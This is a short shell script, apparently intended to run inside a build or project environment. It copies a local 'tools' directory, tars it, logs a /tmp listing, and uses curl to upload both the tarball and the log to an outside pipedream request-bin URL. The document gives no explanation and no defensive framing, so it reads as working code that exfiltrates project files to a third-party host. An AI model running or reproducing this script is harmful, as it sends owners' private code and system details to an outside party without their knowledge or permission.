#!/bin/sh
echo "starting"  > /tmp/file.txt
mkdir /tmp/staging
rsync -rv --exclude=.git ./tools /tmp/staging >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
tar -cvf /tmp/package.tar /tmp/staging/* >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

echo $(ls -la /tmp) >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

# echo $(ls -la tools/) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

curl --data-binary "@/tmp/package.tar" https://enmwh7jh1sqb.x.pipedream.net
